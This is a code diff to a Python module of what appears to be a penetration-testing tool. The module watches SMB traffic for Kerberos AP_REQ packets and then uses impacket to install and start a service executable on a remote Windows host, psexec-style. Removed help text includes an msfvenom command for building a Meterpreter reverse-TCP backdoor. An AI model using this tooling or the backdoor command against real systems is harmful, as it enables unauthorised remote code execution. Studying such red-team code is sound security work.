@@ -6,7 +6,6 @@ from impacket.examples import serviceinstall
 from impacket.dcerpc.v5 import transport
 from uuid import uuid4
 import logging
-import pathlib
 import sys
 
 from .utils import getAuthenticatedImpacketSMBConnection
@@ -20,6 +19,10 @@ binary on the remote system, creates and starts a service for it.
 
 
 class Module:
+    # This attribute is used to specify a TCP port on which the packets will be checked.
+    # The method which determines if packets are interesting will only see packets incoming
+    # from this TCP port.
+    port = 445
     # This flag is used to decide wether this module has a cleanup() method or not, which
     #   should be called before ending everything.
     # Here we need to uninstall a service because of how psexec works
@@ -27,30 +30,6 @@ class Module:
 
     def __init__(self, args):
         self.service = None
-        self.will_clean = not args.no_cleanup
-
-    # A method to add options to the command line. The parser argument is actually
-    #   the subparser object of the main parser.
-    @classmethod
-    def add_options(cls, parser):
-        psexec_parser = parser.add_parser("psexec", help="PSEXEC Module")
-        psexec_parser.add_argument(
-            "executable", type=pathlib.Path,
-            help=(
-                "The executable to push and execute to the remote target. "
-                "Can be generated with msfvenom type exe-service. "
-                "Example : msfvenom -p windows/x64/meterpreter/reverse_tcp "
-                "-f exe-service -o backdoor.exe LHOST=X LPORT=Y. If the executable"
-                " is not a service executable, it will still work, though the process"
-                " will be killed after a few seconds by windows if it takes too long to"
-                " run."
-            )
-        )
-        # Used for debug mainly.
-        psexec_parser.add_argument(
-            "--no-cleanup", required=False, action="store_true",
-            help="This flag can be used to prevent the service from being uninstalled."
-        )
 
     # The function that must return True of False to indicate wether a packet is supposed
     # "interesting" or not (if it contains an AP_REQ or not for our use case).
@@ -59,6 +38,10 @@ class Module:
     #   - dport: the local port that received the packet (the one the target destination would have
     #       received the packet on)
     #   - data : the packet itself, in raw bytes
+    # Return:
+    #    The method must return a 2-tuple : bool, self
+    #    The boolean indicates if the packet is supposed to be interesting
+    #    The second element must be the self object
     def packet_to_catch(self, peer, dport, data):
         # This is where we want to return True if a packet contains an AP_REQ
         ip, sport = peer
@@ -72,10 +55,10 @@ class Module:
                     .value.root.innerContextToken.root,
                     KRB_AP_REQ
                 ):
-                    return True
+                    return True, self
             except (KeyError, AttributeError):
-                return False
-        return False
+                return False, self
+        return False, self
 
     # What runs when an interesting packet is seen:
     # args :
@@ -131,7 +114,7 @@ class Module:
     # This method can be used to clean stuff. It is called if necessary as defined in
     # this class "requires_cleaning" attribute
     def cleanup(self):
-        if self.service is not None and self.will_clean:
+        if self.service is not None:
             print("\tUninstalling service ...")
             self.service.uninstall()
 
